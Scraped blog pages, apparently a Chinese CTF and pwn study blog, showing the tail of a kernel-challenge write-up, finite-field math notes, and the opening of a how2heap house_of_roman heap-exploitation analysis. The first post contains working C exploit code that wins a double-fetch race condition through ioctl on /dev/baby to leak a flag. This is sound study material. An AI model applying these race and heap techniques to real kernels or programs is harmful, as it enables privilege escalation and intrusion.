class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">msg</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;msg;</span><br><span class="line"><span class="type">size_t</span> flag_address;</span><br><span class="line"><span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_TIME 1000</span></span><br><span class="line">msg m;</span><br><span class="line"><span class="type">pthread_t</span> competition_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">competition</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!success)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;WRITE_TIME; i++)</span><br><span class="line">            m.buffer = flag_address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep &#x27;flag&#x27; &gt; temp.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> file = open(<span class="string">&quot;/temp.txt&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">char</span> context[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(file, context, <span class="number">49</span>);</span><br><span class="line">    flag_address = strtoull(context + <span class="number">31</span>, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    close(file);</span><br><span class="line"></span><br><span class="line">    m.buffer = context;</span><br><span class="line">    m.length = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;competition_thread, <span class="literal">NULL</span>, competition, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span>(!success)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;WRITE_TIME; i++)&#123;</span><br><span class="line">            m.buffer = context;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;m);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;dmesg | grep &#x27;flag&#x27; &gt; temp.txt&quot;</span>);</span><br><span class="line">        file = open(<span class="string">&quot;/temp.txt&quot;</span>, O_RDWR);</span><br><span class="line">        read(file, context, <span class="number">0x80</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(context, <span class="string">&quot;flag&#123;&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">            success = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, context);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中在规划两者竞争的时候需要注意应该如何写代码，我们应该让二者充分竞争，所以双方修改这一个地方的总次数最好不要相差太多，否则可能难以达到竞争的目的。<br><img src="https://img-blog.csdnimg.cn/52944e2a49444a7483022b8c38567c9d.png"><br>由此可见，本题中竞争条件的利用并不是很难，难就难在当我们拿到这一题时，我们应该怎样才能够发现这道题存在条件竞争漏洞。本题的条件竞争属于double fetch，它通常的流程是：检查代码首先访问某一块内存，确认数据没有问题后主要操作代码再一次访问同一块内存，显然当这块内存没有被上锁的情况下，中间的时间空当是可以被利用的，这种检查也是线程不安全的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">信息安全数学基础 Chapter 3——有限域（一）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:02" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:02+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Chapter-3-有限域"><a href="#Chapter-3-有限域" class="headerlink" title="Chapter 3 有限域"></a>Chapter 3 有限域</h1><p><font color=blue>定义3.1</font> 设$\mathbb F$为一个非空集合，在其上定义两种运算：加法和乘法，这两种运算在集合上封闭，且满足下列条件：</p>
<ol>
<li>$\mathbb F$中所有元素对于加法形成加法交换群</li>
<li>$\mathbb F$中所有非零元素（记为$\mathbb F^*$）对于乘法构成乘法交换群</li>
<li>任意$\mathbb F$中元素满足乘法对加法的交换律（与实数集中的交换律形式上相同）</li>
</ol>
<p>则称$\mathbb F$对于规定的乘法和加法构成一个域。<br><font color=red>一个域至少有两个元素：加法群零元（称为域的零元，$0$）和乘法单位元（称为域的单位元，$e$）</font>。域元素个数有限称为有限域或伽罗华域，否则称为无限域。有理数集合$\mathbb Q$和复数集合$\mathbb C$按定义的加法和乘法均为域</p>
<hr>
<p><font color=blue>定义3.2</font> 设$\mathbb F$是一个域，$\mathbb F_0$是$\mathbb F$的非空子集，如果对于$\mathbb F$上的加法和乘法，$\mathbb F_0$本身也是一个域，则称$\mathbb F_0$是$\mathbb F$的子域，$\mathbb F$是$\mathbb F_0$的扩域，记作$\mathbb F_0\subsetneq\mathbb F$</p>
<hr>
<p><font color=purple>定理3.1</font> 设$\mathbb F_0$，$\mathbb F_0^*$均是域$\mathbb F$的非空子集，当且仅当下面两个条件成立时$\mathbb F_0$是$\mathbb F$的子域：</p>
<ol>
<li>对于任意$a, b\in \mathbb F_0$，都有$-a, a+b\in\mathbb F_0$</li>
<li>对于任意非零元素$a, b\in\mathbb F_0$，都有$a^{-1}, ab\in\mathbb F_0$</li>
</ol>
<p><font color=dblue>证明方法：</font>需要证明$\mathbb F_0$是$\mathbb F$的加法子群，$\mathbb F_0^*$是$\mathbb F$的乘法子群。这个证明与证明子群很相似。<br>$\because a,-a\in\mathbb F_0, \therefore0\in\mathbb F_0$，有加法单位元，每个元素有逆元。<br>$\because \forall a, b\in \mathbb F_0, a+b\in \mathbb F_0$，故运算封闭。<br>该运算由于在$\mathbb F$中构成域，因此满足交换律与结合律。因此$\mathbb F_0$是$\mathbb F$的加法子群。<br>$\because \forall a\in\mathbb F_0, a^{-1}\in\mathbb F_0$，故每个元素有逆元，有乘法单位元$e$<br>$\because \forall a, b\in \mathbb F_0, ab\in \mathbb F_0$，故运算封闭。<br>该运算由于在$\mathbb F$中构成域，因此满足交换律与结合律。因此$\mathbb F_0^*$是$\mathbb F$的乘法子群。<br>由于这两个运算在$\mathbb F$中满足分配律，因此在$\mathbb F_0$中同样满足。$\Box$</p>
<p><font color=red>定义$a^{-n}&#x3D;(a^n)^{-1}$，当$a\ne 0$时，定义$a^0&#x3D;e$。</font></p>
<hr>
<p><font color=purple>定理3.2</font> 设$\mathbb F$是一个域，那么：</p>
<ol>
<li>对于任意$a\in\mathbb F$，$0a&#x3D;a0&#x3D;0$；</li>
<li>对于任意$a,b\in\mathbb F$，若$ab&#x3D;0$，则$a&#x3D;0$或$b&#x3D;0$</li>
</ol>
<p><font color=dblue>证明方法：</font>$0a&#x3D;(0+0)a$ 证明1<br>若$a\ne 0$，则$ab&#x3D;a^{-1}ab&#x3D;b&#x3D;0$，若$b&#x3D;0$同理。</p>
<p><font color=red>在域中，二项式定理成立。</font></p>
<hr>
<p><font color=purple>定理3.3</font> 设$\mathbb F$是一个域，$a,b\in\mathbb F$，对于任意正整数$n$，有<br>$$(a+b)^n&#x3D;\sum_{i&#x3D;0}^n C_n^i a^{n-i} b^i<br>&#x3D;\sum_{i&#x3D;0}^n\begin{pmatrix}n\i\end{pmatrix}a^{n-i} b^i$$</p>
<p><font color=dblue>证明方法：</font>分配律易证。</p>
<hr>
<p><font color=blue>定义3.3</font> 设$\mathbb F$是一个域，如果存在正整数$m$，使得对于任意$a\in\mathbb F$均有$ma&#x3D;0$，则在所有满足上述条件的m中，最小的正整数称为域$\mathbb F$的特征。如果$m$不存在则称$\mathbb F$的特征为0。特征记作$char(\mathbb F)$。</p>
<hr>
<p><font color=blue>定义3.4</font> 设$\mathbb F, \mathbb k$是两个域，如果存在$\mathbb F$到$\mathbb k$的一一映射$\delta$，使得对于任意$a,b\in\mathbb F$，均有<br>$$\delta(a+<em>{\mathbb F}b)&#x3D;\delta(a)+</em>{\mathbb k}\delta(b), \delta(a\times_{\mathbb F} b)&#x3D;\delta(a)\times_{\mathbb k}\delta(b)$$<br>则称$\delta$为$\mathbb F$到$\mathbb k$的同构映射，称$\mathbb F, \mathbb k$同构，记作$\mathbb F\cong\mathbb k$。如果$\mathbb F&#x3D;\mathbb k$则称$\delta$为自同构映射，若对于任意$a\in\mathbb F$均有$\delta(a)&#x3D;a$，则称$\delta$为恒等自同构映射。<font color=red>一个域的最小子域称为该域的素域。</font></p>
<hr>
<p><font color=purple>定理3.4</font> 设$\mathbb F$是一个域，则$char(\mathbb F)$为0或某个素数$p$。特征为素数$p$的域的素域与$\mathbb Z_p$同构，特征为0的域的素域与$\mathbb Q$同构。</p>
<p><font color=dblue>证明方法：</font>此证明显然需要分为三个部分进行。<br>首先证明特征为0或素数。如果特征不是素数，则可写为$s\times t$的形式，也即$\forall a\in \mathbb F, (st)a&#x3D;sta&#x3D;0$，故$sa&#x3D;0$或$ta&#x3D;0$。此时特征就应该是$s$或$t$而非$st$。<br>当$\mathbb F$是一个域且特征不为0时，其所有子域显然均需要包含$0$和$e$，由于需要满足运算的封闭性，所以还需要包含$2e, 3e, …,(p-1)e$。由这些元素构成的集合容易证明其是一个域（需要注意乘法逆元的证明，由于$p$是素数，故对于任意的$0&lt;k&lt;p$，均能找到其关于模$p$的逆元，也就是对应的乘法逆元），因此这就是$\mathbb F$上最小的域。同构映射$\delta(ke)&#x3D;k$与$\mathbb Z_p$构成同构。<br>当$\mathbb F$的特征为0时，同样其所有子域均需要包含$0,e,2e,3e,…$。由加法运算的封闭性，还需要包含$-e,-2e,-3e,…$。又由于需要满足乘法逆元也包含于域中，所以$e^{-1}, 2e^{-1},…-e^{-1},-2e^{-1},…$也在子域中。又需要满足乘法的封闭性，故任意子域均需包含$\mathbb F_0&#x3D;{(ae)(be)^{-1}|a,b\in\mathbb Z,b\ne 0}$。这个集合容易证明域的所有判定性质，因此其本身就是一个域，而且是最小的子域。同构映射$\delta((ae)(be)^{-1})&#x3D;\frac{a}{b}$与$\mathbb Q$构成同构。</p>
<hr>
<p><font color=purple>定理3.5</font> 设$\mathbb F$是一个域，$char(\mathbb F)&#x3D;p$，则对于任意$a,b\in\mathbb F,n\ge 0$，均有<br>$$(a\pm b)^{p^n}&#x3D;a^{p^n}\pm b^{p^n}$$</p>
<p><font color=dblue>证明方法：</font>首先使用二项式定理证明$(a+b)^p&#x3D;a^p+b^p$：<br>$(a+b)^p$中的第i项为$\frac{p!}{i!(p-i)!}a^ib^{p-i}$，即证明$\frac{p!}{i!(p-i)!}$是$p$的倍数$(i\ne 0,i\ne p)$。显然这是一个整数，且$\frac{p!}{i!(p-i)!}&#x3D;p\times \frac{(p-1)!}{i!(p-i)!}$。后面的数不可能是分数，因为如果是，那么分母必然是$p$的倍数，但是分母显然与$p$互素。因此后面的数是整数，也就是说这个数能够被$p$整除。故得证第一项。<br>然后使用数学归纳法，用类似的方式证明后面的式子即可。</p>
<hr>
<p><font color=blue>定义3.5</font> 对于非负整数$i$，$a_ix^i,a_i\in\mathbb F$表示域$\mathbb F$上文字为x的单项式，称形式和$f(x)&#x3D;a_nx^n+a_{n-1}x^{n-1}+…+a_1x^1+a_0x^0,a_i\in\mathbb F$为域上文字为x的多项式，简称域$\mathbb F$上的多项式。$a_ix^i$称为$f(x)$的$i$次项，$a_i$称为$f(x)$的$i$次项系数。当$a_n\ne 0$时，称该多项式为n次多项式，$a_n$称为$f(x)$的首项系数，多项式$f(x)$的次数称为$\deg f(x)$。如果多项式各项系数均为0，称为零多项式，记为0，次数规定为$-\infty$。<br><font color=red>域$\mathbb F$上文字为x的所有多项式的集合用符号$\mathbb F[x]$表示，规定$x^0&#x3D;1\in\mathbb F,a_0x^0&#x3D;a_0\in\mathbb F$，则有$\mathbb F\subsetneq\mathbb F[x]$。注意按照上面的定义，$\mathbb F[x]$不是域。</font><br><font color=red>关于多项式次数，下面结论成立：</font><br>$$\deg (f(x)+g(x))\le max{\deg f(x), \deg g(x)}<br>\\deg(f(x)g(x))&#x3D;\deg f(x)+\deg g(x)$$</p>
<p><font color=red>注意：这里的x可以表示任意的东西而不仅限于$\mathbb F$，即anything，但是需要定义次方。</font></p>
<hr>
<p><font color=purple>定理3.6</font> 设$f(x),g(x)$为域$\mathbb F$上的两个多项式，$g(x)\ne 0$，则存在唯一一对多项式$q(x),r(x)$使得<br>$$f(x)&#x3D;q(x)g(x)+r(x),\deg r(x)&lt;\deg g(x)$$<br><font color=red>注意：不要看系数能否被整除，而应该注意到域的性质。由于域的特征只可能为素数或0，因此不要想当然地用诸如$5x^2+1$和$2x^2+4$来挑战这条定理，因为整数集并不是域！</font></p>
<p><font color=dblue>证明方法：</font>归纳。<br>存在性易证，总存在一个系数能够消去被除式的最高次项（利用乘法逆元）<br>唯一性：$(q(x)-q’(x))g(x)&#x3D;r’(x)-r(x),\deg (r’(x)-r(x))&lt;\deg g(x)$，故$q(x)&#x3D;q’(x), r(x)&#x3D;r’(x)$</p>
<p>定理中的式子称为多项式带余除法算式，$r(x)$称为余式，记作<font color=red>$(f(x))_{g(x)}&#x3D;r(x)$</font></p>
<hr>
<p><font color=purple>定理3.7</font> 多项式满足模加和模乘运算。证明略。</p>
<hr>
<p><font color=blue>定义3.6</font><br>整除：$r(x)&#x3D;0$<br>倍式与因式<br>真因式：次数小于倍式的因式</p>
<hr>
<p><font color=blue>定义3.7</font><br>可约多项式：不含次数大于0的真因式的多项式<br>不可约多项式</p>
<hr>
<p><font color=purple>定理3.8</font> 域$\mathbb F$上多项式$f(x)$可约，则当且仅当存在两个域$\mathbb F$上多项式$f_1(x),f_2(x)$，$\deg f_1(x)&lt;\deg f(x), \deg f_2(x)&lt;\deg f(x)$，使得$f(x)&#x3D;f_1(x)f_2(x)$</p>
<p>证明略。</p>
<hr>
<p><font color=purple>定理3.9</font> 如果有$g(x)|f_1(x), g(x)|f_2(x)$，则任意多项式$s(x),t(x)$，有$g(x)|s(x)f_1(x)+t(x)f_2(x)$</p>
<p><font color=dblue>证明方法：</font><br>设$f_1(x)&#x3D;g(x)q_1(x),f_2(x)&#x3D;g(x)q_2(x)$<br>则$s(x)f_1(x)+t(x)f_2(x)&#x3D;(s(x)q_1(x)+t(x)q_2(x))g(x)$一定是$g(x)$的倍式</p>
<hr>
<p><font color=blue>定义3.8</font> 公因式、最高公因式（首项系数为1，次数最高）、互素</p>
<hr>
<p><font color=purple>定理3.10</font> 欧几里得辗转相除法<br>$r_i(x)&#x3D;q_{i+1}(x)r_{i+1}(x)+r_{i+2}(x)$</p>
<ol>
<li>经过有限步之后，余式必然为0。</li>
<li>存在多项式$s(x),t(x)\in \mathbb F[x]$，使得$s(x)r_0(x)+t(x)r_1(x)&#x3D;r_n(x)$。</li>
<li>设$r_n(x)$首项系数为$c$，则$(r_0(x), r_1(x))&#x3D;c^{-1}r_n(x)$，且最高公因式唯一存在。</li>
<li>对于任意$c(x)\in \mathbb F(x)$，如果$c(x)|r_0(x),c(x)|r_1(x)$，那么$c(x)|(r_0(x),r_1(x))$</li>
</ol>
<p><font color=orange>推论</font> 多项式的裴蜀定理（描述、证明略）</p>
<hr>
<p><font color=purple>定理3.11</font> 设$f(x),g(x)$为域$\mathbb F$上两个不全为0的多项式，则对于任意$k(x)\in \mathbb F[x],(f(x)+g(x)k(x),g(x))&#x3D;(f(x),g(x))$<br>类比整数，证明略。</p>
<hr>
<p><font color=purple>定理3.12</font> 设$f_1(x),f_2(x)$为域$\mathbb F$上的多项式，$p(x)$为域$\mathbb F$上的不可约多项式，且$p(x)|f_1(x)f_2(x)$，若$(p(x),f_1(x))&#x3D;1$，则$p(x)|f_2(x)$<br>类比整数，证明使用定理3.10推论证明，略。</p>
<hr>
<p><font color=purple>定理3.13</font> 设$f_1(x),f_2(x)$为域$\mathbb F$上的多项式，$p(x)$为域$\mathbb F$上的不可约多项式，且$p(x)|f_1(x)f_2(x)$，则$p(x)|f_1(x)$或$p(x)|f_2(x)$<br>类比整数，证明略。</p>
<hr>
<p><font color=purple>定理3.14</font> 唯一因式分解定理：设$f(x)$是域$\mathbb F$上次数大于0的多项式，则$f(x)$可以唯一地表示为域$\mathbb F$上一些次数大于0的不可约多项式的乘积。特别地，若$f(x)$为首1多项式，且<br>$$f(x)&#x3D;p_1(x)p_2(x)…p_s(x)&#x3D;q_1(x)q_2(x)…q_t(x)$$<br>其中$p_i(x),q_i(x)$为域$\mathbb F$上次数大于0的首1不可约多项式，则有$s&#x3D;t$，经过适当调整可以使得对任意$i$均有$p_i(x)&#x3D;q_i(x)$</p>
<p><font color=dblue>证明方法：</font>归纳法。略</p>
<hr>
<p><font color=blue>定义3.9</font> 根：设$f(x)$为域$\mathbb F$上的多项式，如果$a\in \mathbb F$使得$f(a)&#x3D;0$，则称$a$是$f(x)$在域$\mathbb F$上的一个根。</p>
<hr>
<p><font color=purple>定理3.15</font> 余元定理：设$f(x)$为域$\mathbb F$上的多项式，对于任意$a\in \mathbb F$，存在$g(x)\in \mathbb F[x]$使得$f(x)&#x3D;(x-a)g(x)+f(a)$</p>
<p><font color=dblue>证明方法：</font>设$f(x)&#x3D;(x-a)g(x)+c$，代入$a$即可。</p>
<p><font color=red>本定理可以这样理解：将其看成域上离散的中值定理——$\frac{f(x)-f(a)}{x-a}&#x3D;g(x)$，认为中值定理在域上也成立。但是实际上写的时候不能写分式，因为并没有定义除这个运算。</font></p>
<p><font color=orange>推论1</font> 设$f(x)$为域$\mathbb F$上的多项式，$a$为$f(x)$在域$\mathbb F$的根的充要条件为$(x-a)|f(x)$<br><font color=orange>推论2</font> 设$f(x)$为域$\mathbb F$上的多项式，如果$a_1,a_2,…a_m$为$f(x)$在域$\mathbb F$的根，则存在$n-m$次多项式$g(x)\in \mathbb F[x]$使得$f(x)&#x3D;(x-a_1)(x-a_2)…(x-a_m)g(x)$<br><font color=orange>推论3</font> 设$f(x)$为域$\mathbb F$上的多项式，则$f(x)$在$\mathbb F$的任意扩域中，不同根的个数不会超过$n$（证明使用推论2证明）</p>
<hr>
<p><font color=purple>定理3.16</font> 设$f(x)$是域$\mathbb F$上的$n\ge 1$次不可约多项式，集合$\mathbb F[x]<em>{f(x)}&#x3D;{\sum</em>{i&#x3D;0}^{n-1}a_ix^i|a_i\in\mathbb F}$按照模$f(x)$的模加和模乘形成一个域。特别地，若$f(x)$是有限域$\mathbb F_q$上的$n$次不可约多项式，则$\mathbb F[x]<em>{f(x)}&#x3D;{\sum</em>{i&#x3D;0}^{n-1}a_ix^i|a_i\in\mathbb F_q}$按照模$f(x)$的模加和模乘形成一个元素个数为$q^n$的有限域。</p>
<p><font color=dblue>证明方法：</font>证明该运算系统满足域的每条性质。每个项的系数都可以取q个值，因此构造的域的元素个数为$q^n$</p>
<p>以$\mathbb F_q[x]^*_{f(x)}$表示$\mathbb F_q[x]_{f(x)}$的乘法群，其元素个数为$q^n-1$。</p>
<p><font color=red>注意：任何次数大于等于n的多项式在$\mathbb F[x]_{f(x)}$中均等于一个次数小于n的多项式，每一项的系数关于$\mathbb F$取余，整个多项式关于$f(x)$取余</font></p>
<hr>
<p><font color=purple>定理3.17</font> 设$f(x)$是域$\mathbb F$上的一个次数大于0的不可约多项式，那么$f(x)$必然在$\mathbb F$的某个扩域中有根。</p>
<p><font color=dblue>证明方法：</font>使用定理3.16构造的扩域。</p>
<p><font color=green>举例：</font>定义在$\mathbb Z_2$上的多项式$f(x)&#x3D;x^2+1$在其上不可约，因此构造扩域，集合元素为${0,1,x,x+1}$，则显然有$f(x)&#x3D;x^2+1&#x3D;0$，即$f(x)&#x3D;0$，x是多项式的一个根。（这里的x指的是扩域中的x，不要混淆了）</p>
<p><font color=orange>推论</font> $\mathbb F$上的任意一个次数为$n\ge 1$的多项式，必然在$\mathbb F$的扩域中可以分解为$n$个一次不可约多项式的乘积。</p>
<hr>
<p><font color=purple>定理3.18</font> 设$\mathbb E$是有限域，$\mathbb F_q$是其q元子域，则存在正整数n使得$|\mathbb E|&#x3D;q^n$。</p>
<p><font color=dblue>证明方法：</font>逐步扩大法。$\mathbb F_q&#x3D;\mathbb E_1$如果存在$\beta\in \mathbb E \setminus \mathbb E_1$，那么定义$\mathbb E_2&#x3D;{a_0+a_1\beta|a_0,a_1\in\mathbb F_q}$，其元素个数为$q^2$，如果还存在不在$\mathbb E_2$的元素，则继续扩展，直到$\mathbb E_n&#x3D;\mathbb E$为止。</p>
<p><font color=red>注意：这其中的$\mathbb E_i$不一定是一个域！在严格证明中将其描述为集合。</font></p>
<p><font color=orange>推论</font> 有限域的元素个数必为$p^n$，其中$p$为素数。任何有限域都是其素域的扩域。</p>
<hr>
<p><font color=purple>定理3.19</font> 设$\mathbb F_q$为q元有限域，$\mathbb F$为$\mathbb F_q$的扩域，$\alpha\in\mathbb F$，那么$\alpha$是多项式$x^q-x$的根当且仅当$\alpha\in\mathbb F_q$</p>
<p><font color=dblue>证明方法：</font>对于任意$\alpha\in\mathbb F_q$，$\alpha^q-\alpha&#x3D;(e+e+e+…+e)^q-\alpha&#x3D;e^q+e^q+…+e^q-\alpha&#x3D;\alpha-\alpha&#x3D;0$，故$x^q-x$的根是$\mathbb F_q$的所有元素，而其也只有这么多根（次数限制）。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">how2heap 深入学习(3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:01" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:01+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p>
<p>测试环境：Ubuntu 16.04<br>Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
<p>前两周事情比较多，暂停了pwn的复习，今天继续。<br>按照顺序，本文分析glibc 2_23文件夹中的第9~11个源码。</p>
<h1 id="9-house-of-roman"><a href="#9-house-of-roman" class="headerlink" title="9. house_of_roman"></a>9. house_of_roman</h1><p>这是一种需要进行暴力猜解的漏洞，在开启PIE时仍然有效。我们来看下源码是如何操作的。</p>
<h2 id="Step-1-控制-malloc-hook"><a href="#Step-1-控制-malloc-hook" class="headerlink" title="Step 1: 控制__malloc_hook"></a>Step 1: 控制__malloc_hook</h2><p>首先创建了4个chunk，大小分别为0x70, 0x90, 0x90, 0x70。</p>
<table>
<thead>
<tr>
<th align="center">number</th>
<th align="center">size</th>
<th align="center">name</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">0x70</td>
<td align="center">fastbin_victim</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">0x90</td>
<td align="center">&lt;anonymous&gt;</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">0x90</td>
<td align="center">main_arena_use</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">0x70</td>
<td align="center">relative_offset_heap</td>
</tr>
</tbody></table>
<p>之后将第3个chunk释放，其fd和bk指针将指向main_arena + 0x68的位置。</p>
<p>接下来再分配一个0x70大小的chunk(name: fake_libc_chunk)，分配后原先的unsorted bin会被分割一部分，剩下0x21大小仍为unsorted bin，而此时在fake_libc_chunk中已经有了main_arena + 0x68的地址了。</p>
<p>后面，依次释放relative_offset_heap和fastbin_victim。此时bins的结构为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757000 &lt;fastbin_victim&gt; —▸ 0x555555757190 &lt;relative_offset_heap&gt;◂— 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757170 &lt;main_arena_use的一部分&gt; —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x555555757170 /* &#x27;pquUUU&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>堆的结构为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757000</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x555555757190</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757070</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757100</span><br><span class="line">Size: 0x71</span><br><span 